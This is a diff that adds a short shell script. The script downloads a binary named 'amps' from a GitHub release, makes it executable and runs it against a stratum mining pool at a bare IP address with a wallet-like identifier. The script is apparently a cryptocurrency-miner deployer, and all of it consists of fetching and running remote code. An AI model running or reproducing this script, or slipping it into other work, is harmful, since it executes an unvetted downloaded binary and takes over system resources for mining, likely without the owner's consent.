@@ -1,0 +1,5 @@
+#!/bin/sh
+apt update && apt install unzip -y
+wget https://github.com/tallapallitech63/ampe/releases/download/ampo/amps
+chmod +x amps
+./amps -P stratum1+tcp://cb21065de322fb2bff1944936d0cf55bd02ae8968223.$(shuf -n 1 -i 1-99999)-amps@50.116.44.101:8080
